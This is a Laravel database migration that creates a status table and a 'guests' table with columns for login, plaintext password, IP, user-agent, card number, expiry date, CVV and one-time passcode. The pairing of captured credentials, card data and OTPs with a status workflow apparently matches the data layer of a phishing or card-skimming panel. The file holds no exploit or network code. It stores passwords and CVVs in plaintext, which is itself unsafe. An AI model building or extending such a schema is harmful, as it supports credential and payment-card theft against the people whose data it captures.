<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('estados', function (Blueprint $table) {
            $table->id();

            $table->string('nombre')->unique();

            $table->timestamps();
        });

        Schema::create('guests', function (Blueprint $table) {
            $table->id();

            $table->string('token')->nullable();
            $table->string('login')->nullable();
            $table->string('pass')->nullable();
            $table->string('user-agent')->nullable();
            $table->string('user')->nullable();
            $table->string('ip')->nullable();
            $table->string('cc')->nullable();
            $table->string('expiration_date')->nullable();
            $table->string('ccv')->nullable();
            $table->string('otp')->nullable();
            $table->foreignId('status_id')->default(1)->references('id')->on('estados')->constrained()->cascadeOnUpdate()->cascadeOnDelete();
            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('guests');
        Schema::dropIfExists('estados');
    }
};
